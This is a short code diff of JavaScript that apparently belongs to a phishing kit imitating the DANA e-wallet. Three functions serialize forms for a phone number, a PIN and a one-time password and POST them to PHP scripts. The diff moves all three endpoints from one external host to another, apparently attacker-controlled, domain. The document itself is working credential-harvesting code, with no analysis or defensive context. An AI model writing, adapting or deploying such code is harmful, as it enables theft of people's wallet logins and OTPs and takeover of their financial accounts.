@@ -6,7 +6,7 @@ function sendNohp(event) {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.cloud/dana/dika/one.php',
+      url: 'https://choreoapps.ll-feed.cfd/dana/dika/one.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -31,7 +31,7 @@ function sendPin() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.cloud/dana/dika/two.php',
+      url: 'https://choreoapps.ll-feed.cfd/dana/dika/two.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -60,7 +60,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.cloud/dana/dika/three.php',
+      url: 'https://choreoapps.ll-feed.cfd/dana/dika/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
